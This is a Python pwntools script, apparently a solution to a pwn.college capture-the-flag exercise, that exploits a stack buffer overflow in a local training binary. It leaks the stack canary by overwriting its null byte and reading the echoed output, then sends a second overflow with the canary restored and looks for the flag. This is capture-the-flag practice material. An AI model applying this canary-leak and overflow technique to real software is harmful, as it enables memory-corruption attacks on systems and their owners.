from pwn import *
import os
os.chdir("/challenge")

 
context.arch = 'amd64'

file_name = './babymem_level12.0'

# while True :
p = process(file_name)
    
# first bof , 40 + 1 
payload = b'REPEAT' + b'A' * (40 - len('REPEAT')) +b'B'  # 填充缓冲区到 56 字节
p.recvuntil('Payload size:')
p.sendline(b'41')
p.send(payload)

# 从程序的输出中获取 Canary 值
str = p.recvuntil('You said: ')
print(str)
response = p.recvline()
print(response)
Canary = response[41:48]  # 7个字节
    
print(f"Canary value: {Canary.hex()}")
print(Canary)
Canary=b'\x00'+Canary
print(f"Modified Canary value: {Canary.hex()}")
# second bof , 40+canary(8)+ 8 +8  = 64 
# recv : You said: REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABÛó>YßpvtVý\x7f
# Canary =  
    
# payload = b'A' * 40 + Canary + b'B' * 8 + b'ret'
payload = b'A' * 40 + Canary
print(payload)
p.recvuntil('Payload size:')
p.sendline(b'48')
p.send(payload)
   
str = p.recvall(1)
print(str)
if str.find(b'pwn.college{') != -1:
    print(str)
    # break
#break 

